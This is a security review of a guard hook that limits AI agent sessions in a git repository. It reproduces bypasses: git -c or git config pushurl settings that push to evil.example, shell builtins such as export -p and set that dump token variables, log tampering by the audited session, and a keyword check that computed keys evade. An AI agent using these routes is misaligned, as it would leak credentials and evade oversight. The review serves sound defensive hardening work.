## Blocking findings

### B-1 · The push-remote ban (B3) is bypassed through git configuration

- **Location:** `.claude/hooks/tool_allowlist.py`, `push_checks()` and `git_checks()`. Operating model §9, Shell row, B3: "a push without an explicit `claude/` branch of the `devos` remote".
- **Problem:** `push_checks()` resolves the remote with `git remote get-url <remote>`. That command returns the **fetch** URL. Git pushes to `remote.<name>.pushurl` and applies `url.<base>.pushInsteadOf`, and the guard reads neither. It also skips every `-c` option before the subcommand. `git config` itself is not banned, not even in the live working tree.
- **Reproduced:**
  - Through the guard, all of these get `allow` (rule B0): `git -c remote.origin.pushurl=https://evil.example/x push origin claude/x`; `git -c url.https://evil.example/.pushInsteadOf=https://github.com/ push origin claude/x`; `git config remote.origin.pushurl https://evil.example/x.git`.
  - With plain git, in a scratch repository whose `origin` URL is `https://github.com/batuhanozgun/devos` and whose `pushurl` is a local bare repository: `git remote get-url origin` printed the devos URL, and `git push origin claude/x` delivered the branch to the other repository. The same happened with `-c url.<other>.pushInsteadOf=https://github.com/batuhanozgun/devos`.
- **Why it blocks:** this is exactly the injection route D-008's cost 1 names: a hidden instruction makes a session send data out. It needs no interpreter and no script, so the "lexical analysis" residual risk in §9 does not cover it. The same gap allows `git config core.hooksPath <dir>` in the live tree, which plants hooks that run on later git commands; F2 gives exactly that reason for its ban. It also allows `git config --global …`, which writes `~/.gitconfig`, a file F3 protects.
- **Severity:** blocking. Criterion (d) holds in the letter (a planted case and a near miss exist), but the ban does not hold.
- **Suggested fix:**
  - In `push_checks()`, resolve the URLs with `git remote get-url --push --all <remote>` and check every one.
  - Deny `-c` and `--config-env` on `git push`, or at least any `-c` that names `url.`, `remote.` or `core.`.
  - Deny `git config` writes of `remote.*`, `url.*`, `core.hooksPath`, `core.sshCommand`, `credential.*` and `include.*`, and any `git config --global` or `--system` write.
  - Add a planted case and a near miss for each.

### B-2 · The ban on credential variables and environment dumps (B8) misses the shell's own dump builtins

- **Location:** `shell_checks()` and `command_checks()` (rule B8). Operating model §9: "a credential variable, token file, environment dump or `git credential` (B8)", and "Since D-008 the guard denies the plain routes: … the credential variables and the token file by name, and environment dumps (B7, B8)".
- **Problem:** only `printenv`, a bare `env` and `/proc/*/environ` count as dumps. Several builtins print every exported variable, `GH_TOKEN`, `GITHUB_TOKEN` and `CLAUDE_CODE_MESSAGING_TOKEN` included, and the guard allows each of them (rule B0, reproduced): `set`, `set | grep TOKEN`, `export -p` and `declare -x`. Indirect expansion is allowed too: `x=GH_TOKEN; echo ${!x}`. All of those variables exist in this environment.
- **Why it blocks:** these are not deliberate tricks. A session debugging its environment runs `export -p` or `set` by accident, and the output puts the tokens into the transcript, which is the stated reason for B8. §9 says environment dumps are denied, and for these routes that is false.
- **Severity:** blocking. It defeats an explicit ban of (d), "any use of the session's credential variables", and §9 overstates what the guard does.
- **Suggested fix:**
  - Deny `set` with no arguments, `export -p`, `export` with no arguments, `declare`/`typeset` with `-p`, `-x` or no arguments, and `compgen -v`.
  - Deny `${!` indirect expansion.
  - Add planted cases and near misses: `set -euo pipefail` and `export FOO=1` must stay allowed.

## Minor findings (non-blocking alone; a re-review should check them)

### m-1 · The decision log can be edited by the session it audits, and only a report the session writes itself reaches `main`

- **Location:** guard `LOG_DIR` (`/tmp/devos-guard`); operating model §9 "The decision log lives in the container"; Appendix M row "Decision log and `guard_report.py`".
- **Problem:** `/tmp/devos-guard/<session>.jsonl` sits in no guarded zone, so the session can rewrite or delete it with `Write`, `Edit` or the shell, and `guard_report.py` trusts its contents. The audit record that reaches `main` is the report the audited session chooses to paste. §9 states that the log is lost with the container, but not that it can be tampered with or that it is self-reported. Batu's requirement was auditability ("Denetim yapılamıyor sistemde"), so the omission understates the residual risk.
- **Fix:** add `LOG_DIR` to the guarded zones for the file tools and for shell writes. State in §9 that the log is self-reported, and that the transcript, keyed by tool-use ID, is the independent record. Optionally chain each record to the hash of the previous one.

### m-2 · `Workflow` (T3) is weaker than v1.7, and its check is incomplete

- **Location:** `decide()`, the `Workflow` branch.
- **Problem:**
  - v1.7 blocked `Workflow`. It is now allowed when the script text does not contain the word "isolation".
  - These inputs are allowed without inspection (reproduced): `{"name": "<saved or built-in workflow>"}`, which reads no script; a relative `scriptPath` the hook cannot resolve; a computed key such as `{["iso"+"lation"]: …}`; and `resumeFromRunId`.
  - Whether hooks fire inside workflow agents is unobserved. §9 says so, and T-G3 lists a subagent denial but no workflow-agent denial.
- **Fix:** resolve a relative `scriptPath` against the hook's `cwd`. Deny `name` unless the workflow is listed. Deny a script that builds object keys dynamically, or deny any script mentioning `worktree` or `remote`. Add a denial inside a workflow agent to the T-G3 probe list.

### m-3 · Break-glass when every guarded session is locked out is not named

- **Location:** operating model §11 "Guard denial" row ("If the guard blocks its own fix, the break-glass revert … is allowed"); L-094 "Next".
- **Problem:** `main()` turns any exception in `decide()` into a deny (G0). That is correct fail-closed behaviour, but a merged guard bug that raises on common input denies every call: `Bash`, the GitHub tools and `merge_pull_request` alike. Every session created on `main` afterwards, and every session that has run `tools/sync_worktree.sh`, can then do nothing, including the W-R7 revert. The gate itself supports a pure break-glass revert (`break_glass_target`). Only an actor outside the new guard can carry the revert out, though: a session not yet synced, or Batu through GitHub's own "Revert". The text never says who that actor is.
- **Fix:** state in §9 or §11 that, until T-G3 passes, at least one session stays unsynced (L-094 already implies this for the conversation session), and name the last-resort route if none is left. Add a G0 "deny everything" case to T-G3's reading of a failure.

## The two fixed questions of (h)

**1. Does any route the new guard allows reproduce an outcome refused on 2026-10-04 (L-088, L-090) without a new design?**

- **L-088.** The refused outcome is a session guarded by an unreviewed candidate hook before review, through a rule exception. By its own rules the guard does not reproduce it:
  - `create_session` is allowed only on `main` or on the branch checked out in the live tree.
  - Revision changes in the live tree are denied (B4).
  - The live tree moves only by a fast-forward to `origin/main`.
- **The lexical gap.** A script or interpreter that runs `git checkout` in the live tree (`bash ./x.sh` is allowed) would reach that outcome. That is routing around a ban (§11) and falls under the stated lexical residual risk, so it is not a route the rules allow.
- **L-090, and the reads refused in run `session_016nBesoa9ipYxKHpTXH5LRd`.** Those refused outcomes were plain reads of the public log. Every boot will now do them, and the guard allows them. The read itself protects nothing, so allowing it is harmless. It does contradict D-008's sentence that the refused outcomes of L-088 and L-090 "stay refused". The text should say that the L-090 read was a classifier false positive with no protected property, and that only L-088's outcome stays refused.
- **Answer:** no for L-088. Yes for L-090, harmlessly, but the records should say so.

**2. Is any rule here weaker than the v1.7 guard without D-008 requiring it?**

- **`Workflow` (T3).** v1.7 blocked it. It is now allowed with a lexical check that has gaps (m-2). D-008 requires ultracode, and ultracode plans workflows, so allowing `Workflow` in some form is required by D-008. The gaps in the check are not.
- **Everything else** is kept or made stronger. Allowing every unbanned call explicitly, which skips the prompt, is what D-008 requires.

## Is the guard able to block its own repair?

- **The normal repair route works:** a scratch clone, a pull request, review, the merge gate, then `tools/sync_worktree.sh`. The guard sees only the script name, so the script's internal `git checkout -- owned_ids.txt` and `git merge --ff-only` run.
- **No deadlock in the merge path:** the reviewer's recorder line is class normal (merge-gate test case 2).
- **A gate bug that refuses covered merges** is repaired by an exact break-glass revert, which the gate classes as normal.
- **The deadlock that remains is m-3:** a merged guard that raises on common input denies every call in every synced or newly created session. The repair then needs an actor outside the guard, and the text names none.
